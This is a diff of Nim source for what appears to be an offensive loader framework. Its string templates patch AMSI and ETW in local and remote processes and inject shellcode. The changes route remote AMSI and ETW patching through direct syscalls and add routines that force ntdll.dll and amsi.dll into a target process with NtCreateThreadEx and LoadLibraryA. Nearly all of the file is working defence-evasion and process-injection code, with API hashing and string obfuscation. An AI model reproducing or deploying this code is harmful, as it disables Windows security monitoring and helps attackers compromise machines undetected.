@@ -33,7 +33,7 @@ MyGetCurrentProcessId = cast[GetCurrentProcessId_t](cast[LPVOID](get_function_ad
 
 MyVirtualProtect = cast[VirtualProtect_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualProtect_HASH, 0, FALSE))
 
-
+MyOpenProcess = cast[OpenProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), OpenProcess_HASH, 0, FALSE)))
 """
 
 let DInvokeLoadLibraryAGetProcAddress * = """
@@ -88,34 +88,30 @@ type
   RtlAllocateHeap_t* = proc (HeapHandle: PVOID, Flags: ULONG, Size: SIZE_T): PVOID {.stdcall.}
   GetProcessHeap_t* = proc (): HANDLE {.stdcall.}
   ReadFile_t* = proc (hFile: HANDLE, lpBuffer: LPVOID, nNumberOfBytesToRead: DWORD, lpNumberOfBytesRead: LPDWORD, lpOverlapped: LPOVERLAPPED): WINBOOL {.stdcall.}
-  lstrcmpA_t* = proc (lpString1: LPCSTR, lpString2: LPCSTR): int32 {.stdcall.}
-
+  
 const
   CreateFileA_HASH * = obf("CreateFileA")
   GetFileSize_HASH * = obf("GetFileSize")
   RtlAllocateHeap_HASH * = obf("RtlAllocateHeap")
   GetProcessHeap_HASH * = obf("GetProcessHeap")
   ReadFile_HASH * = obf("ReadFile")
-  lstrcmpA_HASH * = obf("lstrcmpA")
-
+  
 var MyCreateFileA*: CreateFileA_t
 var MyGetFileSize*: GetFileSize_t
 var MyRtlAllocateHeap*: RtlAllocateHeap_t
 var MyGetProcessHeap*: GetProcessHeap_t
 var MyReadFile*: ReadFile_t
-var MylstrcmpA*: lstrcmpA_t
 
 MyCreateFileA = cast[CreateFileA_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), CreateFileA_HASH, 0, FALSE)))
 MyGetFileSize = cast[GetFileSize_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetFileSize_HASH, 0, FALSE)))
 MyRtlAllocateHeap = cast[RtlAllocateHeap_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(NTDLL_DLL, FALSE)), RtlAllocateHeap_HASH, 0, TRUE)))
 MyGetProcessHeap = cast[GetProcessHeap_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetProcessHeap_HASH, 0, FALSE)))
 MyReadFile = cast[ReadFile_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), ReadFile_HASH, 0, FALSE)))
-MylstrcmpA = cast[lstrcmpA_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), lstrcmpA_HASH, 0, FALSE)))
 
 proc RVAtoRawOffset(RVA: DWORD_PTR, section: PIMAGE_SECTION_HEADER): PVOID =
     return cast[PVOID](RVA - section.VirtualAddress + section.PointerToRawData)
 
-proc GetSyscallStub(functionName: LPCSTR, syscallStub: LPVOID): BOOL =
+proc GetSyscallStub(functionName: cstring, syscallStub: LPVOID): BOOL =
     var
         file: HANDLE
         fileSize: DWORD
@@ -153,9 +149,8 @@ proc GetSyscallStub(functionName: LPCSTR, syscallStub: LPVOID): BOOL =
     for low2 in 0 ..< exportDirectory.NumberOfNames:
         var functionNameVA: DWORD_PTR = cast[DWORD_PTR](RVAtoRawOffset(cast[DWORD_PTR](fileData) + addressOfNames[low2], rdataSection))
         var functionVA: DWORD_PTR = cast[DWORD_PTR](RVAtoRawOffset(cast[DWORD_PTR](fileData) + addressOfFunctions[low2 + 1], textSection))
-        var functionNameResolved: LPCSTR = cast[LPCSTR](functionNameVA)
-        var compare: int = MylstrcmpA(functionNameResolved,functionName)
-        if (compare == 0):
+        var functionNameResolved: cstring = cast[cstring](functionNameVA)
+        if (functionNameResolved == functionName):
             copyMem(syscallStub, cast[LPVOID](functionVA), SYSCALL_STUB_SIZE)
             stubFound = 1
     return stubFound
@@ -204,7 +199,7 @@ var hProcess: HANDLE
 hProcess = MyGetCurrentProcess()
     
 let tProcess2 = MyGetCurrentProcessId()
-MyOpenProcess = cast[OpenProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), OpenProcess_HASH, 0, FALSE)))
+
 var pHandle2: HANDLE = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
 var syscallStub_NtProtect: LPVOID
 
@@ -270,15 +265,15 @@ proc GetUnhookStubs(): void =
     
     # Define NtProtectVirtualMemory
     NtProtectVirtualMemory = cast[myNtProtectVirtM](cast[LPVOID](syscallStub_NtProtect))
-    success = MyVirtualProtect(cast[LPVOID](syscallStub_NtProtect), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection)
+    success = MyVirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
     
     # define NtWriteVirtualMemory
     NtWriteVirtualMemory = cast[myNtWriteVirtM](cast[LPVOID](syscallStub_NtWrite))
-    success = MyVirtualProtect(cast[LPVOID](syscallStub_NtWrite), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection)
+    success = MyVirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
     
     # define NtClose
     NtClose = cast[myNtClose](cast[LPVOID](syscallStub_NtClose))
-    success = MyVirtualProtect(cast[LPVOID](syscallStub_NtClose), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection)
+    success = MyVirtualProtect(cast[LPVOID](syscallStub_NtClose), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
     
     
     success = GetSyscallStub(obf("NtProtectVirtualMemory"), cast[LPVOID](syscallStub_NtProtect))
@@ -385,11 +380,11 @@ proc PatchAmsi(): bool =
 
     # Define NtProtectVirtualMemory
     var NtProtectVirtualMemory: myNtProtectVirtM = cast[myNtProtectVirtM](cast[LPVOID](syscallStub_NtProtect))
-    success = MyVirtualProtect(cast[LPVOID](syscallStub_NtProtect), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection)
+    success = MyVirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
 
     # define NtWriteVirtualMemory
     let NtWriteVirtualMemory = cast[myNtWriteVirtM](cast[LPVOID](syscallStub_NtWrite))
-    success = MyVirtualProtect(cast[LPVOID](syscallStub_NtWrite), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection)
+    success = MyVirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
 
     var protectAddress = cs
     success = GetSyscallStub("NtProtectVirtualMemory", cast[LPVOID](syscallStub_NtProtect))
@@ -460,11 +455,11 @@ proc Patchntdll(): bool =
 
     # Define NtProtectVirtualMemory
     var NtProtectVirtualMemory: myNtProtectVirtM = cast[myNtProtectVirtM](cast[LPVOID](syscallStub_NtProtect))
-    success = MyVirtualProtect(cast[LPVOID](syscallStub_NtProtect), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection)
+    success = MyVirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
 
     # define NtWriteVirtualMemory
     let NtWriteVirtualMemory = cast[myNtWriteVirtM](cast[LPVOID](syscallStub_NtWrite))
-    success = MyVirtualProtect(cast[LPVOID](syscallStub_NtWrite), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection)
+    success = MyVirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
 
     var protectAddress = cs
     success = GetSyscallStub("NtProtectVirtualMemory", cast[LPVOID](syscallStub_NtProtect))
@@ -499,6 +494,235 @@ when isMainModule:
     echo obf("[*] ETW blocked by patch: ") & fmt"{bool(success)}"
 """
 
+let RemoteLoadNTDLLStub* = """
+
+proc remoteLoadNtdll(processID: var DWORD): bool =
+
+   
+    # C:\windows\system32\ntdll.dll
+    var friendlycode: array[29, char]  = [char(0x43), char(0x3A), char(0x5C), char(0x77), char(0x69), char(0x6E), char(0x64),
+    char(0x6F), char(0x77), char(0x73), char(0x5C), char(0x73), char(0x79), char(0x73), char(0x74), char(0x65), char(0x6D),
+    char(0x33), char(0x32), char(0x5C), char(0x6E), char(0x74), char(0x64), char(0x6C),
+    char(0x6C), char(0x2E), char(0x64), char(0x6C), char(0x6C)]
+    
+    echo obf("[*] Loading ntdll.dll in the remote process: "), processID
+    var cid: CLIENT_ID
+    var oa: OBJECT_ATTRIBUTES
+    var pHandle: HANDLE
+    var tHandle: HANDLE
+    var ds: LPVOID
+    var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)
+
+    cid.UniqueProcess = processID
+
+    let tProcess2 = MyGetCurrentProcessId()
+    MyOpenProcess = cast[OpenProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), OpenProcess_HASH, 0, FALSE)))
+    var pHandle2: HANDLE = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
+
+    MyVirtualAllocEx = cast[VirtualAllocEx_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualAllocEx_HASH, 0, FALSE))
+    let syscallStub_NtOpenP = MyVirtualAllocEx(
+    pHandle2,
+    NULL,
+    cast[SIZE_T](SYSCALL_STUB_SIZE),
+    MEM_COMMIT,
+    PAGE_EXECUTE_READ_WRITE
+    )
+
+    
+    var syscallStub_NtAlloc: HANDLE = cast[HANDLE](syscallStub_NtOpenP) + cast[HANDLE](SYSCALL_STUB_SIZE)
+    var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtAlloc) + cast[HANDLE](SYSCALL_STUB_SIZE)
+    var syscallStub_NtCreate: HANDLE = cast[HANDLE](syscallStub_NtWrite) + cast[HANDLE](SYSCALL_STUB_SIZE)
+
+
+    var oldProtection: DWORD = 0
+
+    # define NtOpenProcess
+    var NtOpenProcess: myNtOpenProcess = cast[myNtOpenProcess](cast[LPVOID](syscallStub_NtOpenP))
+    VirtualProtect(cast[LPVOID](syscallStub_NtOpenP), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
+
+    # define NtAllocateVirtualMemory
+    let NtAllocateVirtualMemory = cast[myNtAllocateVirtualMemory](cast[LPVOID](syscallStub_NtAlloc))
+    VirtualProtect(cast[LPVOID](syscallStub_NtAlloc), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
+
+    # define NtWriteVirtualMemory
+    let NtWriteVirtualMemory = cast[myNtWriteVirtualMemory](cast[LPVOID](syscallStub_NtWrite))
+    VirtualProtect(cast[LPVOID](syscallStub_NtWrite), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
+
+    # define NtCreateThreadEx
+    let NtCreateThreadEx = cast[myNtCreateThreadEx](cast[LPVOID](syscallStub_NtCreate))
+    VirtualProtect(cast[LPVOID](syscallStub_NtCreate), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
+
+    var status: NTSTATUS
+    var success: BOOL
+
+    success = GetSyscallStub("NtOpenProcess", cast[LPVOID](syscallStub_NtOpenP))
+    success = GetSyscallStub("NtAllocateVirtualMemory", cast[LPVOID](syscallStub_NtAlloc))
+    success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
+    success = GetSyscallStub("NtCreateThreadEx", cast[LPVOID](syscallStub_NtCreate))
+
+    
+    status = NtOpenProcess(
+        &pHandle,
+        PROCESS_ALL_ACCESS, 
+        &oa, &cid         
+    )
+    echo obf("[*] NtOpenProcess: "), status
+
+    status = NtAllocateVirtualMemory(
+        pHandle, &ds, 0, &sc_size, 
+        MEM_COMMIT, 
+        PAGE_EXECUTE_READWRITE)
+    echo obf("[*] NtAllocateVirtualMemory: "), status
+    var bytesWritten: SIZE_T
+
+    status = NtWriteVirtualMemory(
+        pHandle, 
+        ds, 
+        unsafeAddr friendlycode, 
+        sc_size-1, 
+        addr bytesWritten)
+
+    echo obf("[*] NtWriteVirtualMemory: "), status
+    echo obf("    \\-- bytes written: "), bytesWritten
+    echo obf("")
+    var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](MyGetProcAddress(MyGetModuleHandleA("Kernel32.dll"), "LoadLibraryA"));
+    status = NtCreateThreadEx(
+        &tHandle, 
+        THREAD_ALL_ACCESS, 
+        NULL, 
+        pHandle,
+        pfnThreadRtn, 
+        ds, FALSE, 0, 0, 0, NULL)
+    echo obf("[*] NtCreateThreadEx: "), status
+    status = NtClose(tHandle)
+    status = NtClose(pHandle)
+
+    if(status == 0):
+      return true
+    else:
+      return false
+    # This doesn't work so far for some reason
+    success = MyVirtualProtect(syscallStub_NtOpenP, cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READ, addr oldProtection)
+    if (success):
+      echo obf("set back old protect")
+    echo success
+
+"""
+
+let RemoteLoadAMSIStub* = """
+
+proc remoteLoadAmsi(processID: var DWORD): bool =
+
+   
+    # C:\windows\system32\amsi.dll
+    var friendlycode: array[28, char]  = [char(0x43), char(0x3A), char(0x5C), char(0x77), char(0x69), char(0x6E), char(0x64),
+     char(0x6F), char(0x77), char(0x73), char(0x5C), char(0x73), char(0x79), char(0x73), char(0x74), char(0x65), char(0x6D),
+     char(0x33), char(0x32), char(0x5C), char(0x61), char(0x6D), char(0x73), char(0x69),char(0x2E), char(0x64), char(0x6C), char(0x6C)]
+    
+    echo obf("[*] Loading amsi.dll in the remote process: "), processID
+    var cid: CLIENT_ID
+    var oa: OBJECT_ATTRIBUTES
+    var pHandle: HANDLE
+    var tHandle: HANDLE
+    var ds: LPVOID
+    var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)
+
+    cid.UniqueProcess = processID
+
+    let tProcess2 = MyGetCurrentProcessId()
+    MyOpenProcess = cast[OpenProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), OpenProcess_HASH, 0, FALSE)))
+    var pHandle2: HANDLE = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
+
+    MyVirtualAllocEx = cast[VirtualAllocEx_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualAllocEx_HASH, 0, FALSE))
+    let syscallStub_NtOpenP = MyVirtualAllocEx(
+    pHandle2,
+    NULL,
+    cast[SIZE_T](SYSCALL_STUB_SIZE),
+    MEM_COMMIT,
+    PAGE_EXECUTE_READ_WRITE
+    )
+
+    
+    var syscallStub_NtAlloc: HANDLE = cast[HANDLE](syscallStub_NtOpenP) + cast[HANDLE](SYSCALL_STUB_SIZE)
+    var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtAlloc) + cast[HANDLE](SYSCALL_STUB_SIZE)
+    var syscallStub_NtCreate: HANDLE = cast[HANDLE](syscallStub_NtWrite) + cast[HANDLE](SYSCALL_STUB_SIZE)
+
+
+    var oldProtection: DWORD = 0
+
+    # define NtOpenProcess
+    var NtOpenProcess: myNtOpenProcess = cast[myNtOpenProcess](cast[LPVOID](syscallStub_NtOpenP))
+    VirtualProtect(cast[LPVOID](syscallStub_NtOpenP), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
+
+    # define NtAllocateVirtualMemory
+    let NtAllocateVirtualMemory = cast[myNtAllocateVirtualMemory](cast[LPVOID](syscallStub_NtAlloc))
+    VirtualProtect(cast[LPVOID](syscallStub_NtAlloc), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
+
+    # define NtWriteVirtualMemory
+    let NtWriteVirtualMemory = cast[myNtWriteVirtualMemory](cast[LPVOID](syscallStub_NtWrite))
+    VirtualProtect(cast[LPVOID](syscallStub_NtWrite), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
+
+    # define NtCreateThreadEx
+    let NtCreateThreadEx = cast[myNtCreateThreadEx](cast[LPVOID](syscallStub_NtCreate))
+    VirtualProtect(cast[LPVOID](syscallStub_NtCreate), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
+
+    var status: NTSTATUS
+    var success: BOOL
+
+    success = GetSyscallStub("NtOpenProcess", cast[LPVOID](syscallStub_NtOpenP))
+    success = GetSyscallStub("NtAllocateVirtualMemory", cast[LPVOID](syscallStub_NtAlloc))
+    success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
+    success = GetSyscallStub("NtCreateThreadEx", cast[LPVOID](syscallStub_NtCreate))
+
+    
+    status = NtOpenProcess(
+        &pHandle,
+        PROCESS_ALL_ACCESS, 
+        &oa, &cid         
+    )
+    echo obf("[*] NtOpenProcess: "), status
+
+    status = NtAllocateVirtualMemory(
+        pHandle, &ds, 0, &sc_size, 
+        MEM_COMMIT, 
+        PAGE_EXECUTE_READWRITE)
+    echo obf("[*] NtAllocateVirtualMemory: "), status
+    var bytesWritten: SIZE_T
+
+    status = NtWriteVirtualMemory(
+        pHandle, 
+        ds, 
+        unsafeAddr friendlycode, 
+        sc_size-1, 
+        addr bytesWritten)
+
+    echo obf("[*] NtWriteVirtualMemory: "), status
+    echo obf("    \\-- bytes written: "), bytesWritten
+    echo obf("")
+    var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](MyGetProcAddress(MyGetModuleHandleA("Kernel32.dll"), "LoadLibraryA"));
+    status = NtCreateThreadEx(
+        &tHandle, 
+        THREAD_ALL_ACCESS, 
+        NULL, 
+        pHandle,
+        pfnThreadRtn, 
+        ds, FALSE, 0, 0, 0, NULL)
+    echo obf("[*] NtCreateThreadEx: "), status
+    status = NtClose(tHandle)
+    status = NtClose(pHandle)
+
+    if(status == 0):
+      return true
+    else:
+      return false
+    # This doesn't work so far for some reason
+    success = MyVirtualProtect(syscallStub_NtOpenP, cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READ, addr oldProtection)
+    if (success):
+      echo obf("set back old protect")
+    echo success
+
+"""
+
 let RemotePatchAMSIStub* = """
 
 proc RemotePatchAmsi(hProcss :HANDLE): bool =
@@ -521,16 +745,56 @@ proc RemotePatchAmsi(hProcss :HANDLE): bool =
         echo obf("[X] Failed to get the address of 'AmsiScanBuffer'")
         return disabled
 
-    if WriteProcessMemory(hProcss, RemoteProc, unsafeAddr patch, cast[SIZE_T](patch.len), NULL) == 0:
-        echo obf("Failed to write process memory")
+    var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtProtect) + cast[HANDLE](SYSCALL_STUB_SIZE)
+
+    var oldProtection: DWORD = 0
+    var success: BOOL
+
+    # Define NtProtectVirtualMemory
+    var NtProtectVirtualMemory: myNtProtectVirtM = cast[myNtProtectVirtM](cast[LPVOID](syscallStub_NtProtect))
+    success = MyVirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
+
+    # define NtWriteVirtualMemory
+    let NtWriteVirtualMemory = cast[myNtWriteVirtM](cast[LPVOID](syscallStub_NtWrite))
+    success = MyVirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
+
+    var protectAddress = RemoteProc
+
+    success = GetSyscallStub("NtProtectVirtualMemory", cast[LPVOID](syscallStub_NtProtect))
+    success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
+
+    var friendlycodeLength = cast[SIZE_T](patch.len)
+    var t: ULONG
+    var op: ULONG
+    success = NtProtectVirtualMemory(hProcss,addr protectAddress,addr friendlycodeLength,0x40,addr t) 
+    if (success != 0):
+        echo obf("NtProtectVirtualMemory for remote process failed")
+        return disabled
+    echo obf("[*] Applying remote Syscall AMSI patch")
+    var outLength: SIZE_T
+    
+    success = NtWriteVirtualMemory(hProcss,RemoteProc,unsafeAddr patch,patch.len,addr outLength)
+    if (success != 0):
+        echo obf("NtWriteVirtualMemory for remote process failed")
+        return disabled
+    success =  NtProtectVirtualMemory(hProcss,addr protectAddress,addr friendlycodeLength,t,addr op)
+    if (success != 0):
+        echo obf("NtProtectVirtualMemory for remote process failed")
         return disabled
     else:
+        echo obf("[*] OldProtect set back")
         disabled = true
+    success = MyVirtualProtect(syscallStub_NtProtect, 4096, PAGE_READWRITE, addr op)
+
     return disabled
 
 when isMainModule:
-    var hProcams = OpenProcess(PROCESS_ALL_ACCESS, FALSE, remoteProcID)
+    var hProcams = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, remoteProcID)
     success = RemotePatchAmsi(hProcams)
+    if (success == 0):
+        success = remoteLoadAmsi(remoteProcID)
+        HowMuchTimeWouldYoulikeToSleep(2)
+        success = RemotePatchAmsi(hProcams)
     echo obf("[*] AMSI disabled in the remote process: ") & fmt"{bool(success)}"
 
 """
@@ -556,16 +820,61 @@ proc RemotePatchEtw(hProcess : HANDLE) : bool =
         echo obf("[X] Failed to get the address of 'EtwEventWrite'")
         return disabled
 
-    if WriteProcessMemory(hProcess, RemoteProc, unsafeAddr patch, cast[SIZE_T](patch.len), NULL) == 0:
-        echo obf("Failed to write process memory")
+    var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtProtect) + cast[HANDLE](SYSCALL_STUB_SIZE)
+
+    var oldProtection: DWORD = 0
+    var success: BOOL
+
+    # Define NtProtectVirtualMemory
+    var NtProtectVirtualMemory: myNtProtectVirtM = cast[myNtProtectVirtM](cast[LPVOID](syscallStub_NtProtect))
+    success = MyVirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
+
+    # define NtWriteVirtualMemory
+    let NtWriteVirtualMemory = cast[myNtWriteVirtM](cast[LPVOID](syscallStub_NtWrite))
+    success = MyVirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
+
+    var protectAddress = RemoteProc
+
+    success = GetSyscallStub("NtProtectVirtualMemory", cast[LPVOID](syscallStub_NtProtect))
+    success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
+
+    var friendlycodeLength = cast[SIZE_T](patch.len)
+    var t: ULONG
+    var op: ULONG
+    success = NtProtectVirtualMemory(hProcess,addr protectAddress,addr friendlycodeLength,0x40,addr t) 
+    if (success != 0):
+        echo obf("NtProtectVirtualMemory for remote process failed")
+        return disabled
+    echo obf("[*] Applying remote Syscall ETW patch")
+    var outLength: SIZE_T
+    
+    success = NtWriteVirtualMemory(hProcess,RemoteProc,unsafeAddr patch,patch.len,addr outLength)
+    if (success != 0):
+        echo obf("NtWriteVirtualMemory for remote process failed")
+        return disabled
+    success =  NtProtectVirtualMemory(hProcess,addr protectAddress,addr friendlycodeLength,t,addr op)
+    if (success != 0):
+        echo obf("NtProtectVirtualMemory for remote process failed")
         return disabled
     else:
         disabled = true
+        echo obf("[*] OldProtect set back")
+    success = MyVirtualProtect(syscallStub_NtProtect, 4096, PAGE_READWRITE, addr op)
+
+    #if WriteProcessMemory(hProcess, RemoteProc, unsafeAddr patch, cast[SIZE_T](patch.len), NULL) == 0:
+    #    echo obf("Failed to write process memory")
+    #    return disabled
+    #else:
+    #    disabled = true
     return disabled
 
 when isMainModule:
-    var hProcetw = OpenProcess(PROCESS_ALL_ACCESS, FALSE, remoteProcID)
+    var hProcetw = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, remoteProcID)
     success = RemotePatchEtw(hProcetw)
+    if (success == 0):
+        success = remoteLoadNtdll(remoteProcID)
+        HowMuchTimeWouldYoulikeToSleep(2)
+        success = RemotePatchEtw(hProcetw)
     echo obf("[*] ETW disabled in the remote process: ") & fmt"{bool(success)}"
 
 """
@@ -652,7 +961,7 @@ proc injectCreateRemoteThread(friendlycode: openarray[byte]): void =
 let ShellcoderemoteinjectStub * = """
     
     let tProcess2 = MyGetCurrentProcessId()
-    MyOpenProcess = cast[OpenProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), OpenProcess_HASH, 0, FALSE)))
+
     var pHandle2: HANDLE = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
 
     MyVirtualAllocEx = cast[VirtualAllocEx_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualAllocEx_HASH, 0, FALSE))
@@ -674,19 +983,19 @@ let ShellcoderemoteinjectStub * = """
 
     # define NtOpenProcess
     var NtOpenProcess: myNtOpenProcess = cast[myNtOpenProcess](cast[LPVOID](syscallStub_NtOpenP))
-    VirtualProtect(cast[LPVOID](syscallStub_NtOpenP), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
+    VirtualProtect(cast[LPVOID](syscallStub_NtOpenP), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection);
 
     # define NtAllocateVirtualMemory
     let NtAllocateVirtualMemory = cast[myNtAllocateVirtualMemory](cast[LPVOID](syscallStub_NtAlloc))
-    VirtualProtect(cast[LPVOID](syscallStub_NtAlloc), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
+    VirtualProtect(cast[LPVOID](syscallStub_NtAlloc), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection);
 
     # define NtWriteVirtualMemory
     let NtWriteVirtualMemory = cast[myNtWriteVirtualMemory](cast[LPVOID](syscallStub_NtWrite))
-    VirtualProtect(cast[LPVOID](syscallStub_NtWrite), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
+    VirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection);
 
     # define NtCreateThreadEx
     let NtCreateThreadEx = cast[myNtCreateThreadEx](cast[LPVOID](syscallStub_NtCreate))
-    VirtualProtect(cast[LPVOID](syscallStub_NtCreate), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
+    VirtualProtect(cast[LPVOID](syscallStub_NtCreate), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection);
 
     var status: NTSTATUS
     var success: BOOL
@@ -797,11 +1106,11 @@ proc pwndem[byte](friendlycode: openarray[byte]): void =
 
     # define NtAllocateVirtualMemory
     let NtAllocateVirtualMemory = cast[myNtAllocateVirtualMemory](cast[LPVOID](syscallStub_NtAlloc))
-    success = MyVirtualProtect(cast[LPVOID](syscallStub_NtAlloc), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection)
+    success = MyVirtualProtect(cast[LPVOID](syscallStub_NtAlloc), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
 
     # define NtWriteVirtualMemory
     let NtWriteVirtualMemory = cast[myNtWriteVirtualMemory](cast[LPVOID](syscallStub_NtWrite))
-    success = MyVirtualProtect(cast[LPVOID](syscallStub_NtWrite), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection)
+    success = MyVirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
 
 
     var status: NTSTATUS
@@ -1067,15 +1376,15 @@ proc GetStubs(): void =
     
     # Define NtProtectVirtualMemory
     NtProtectVirtualMemory = cast[myNtProtectVirtM](cast[LPVOID](syscallStub_NtProtect))
-    success = MyVirtualProtect(cast[LPVOID](syscallStub_NtProtect), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection)
+    success = MyVirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
     
     # define NtWriteVirtualMemory
     NtWriteVirtualMemory = cast[myNtWriteVirtM](cast[LPVOID](syscallStub_NtWrite))
-    success = MyVirtualProtect(cast[LPVOID](syscallStub_NtWrite), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection)
+    success = MyVirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
     
     # define NtAllocateVirtualMemory
     NtAllocateVirtualMemory = cast[myNtAllocateVirtM](cast[LPVOID](syscallStub_NtAlloc))
-    success = MyVirtualProtect(cast[LPVOID](syscallStub_NtAlloc), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection)
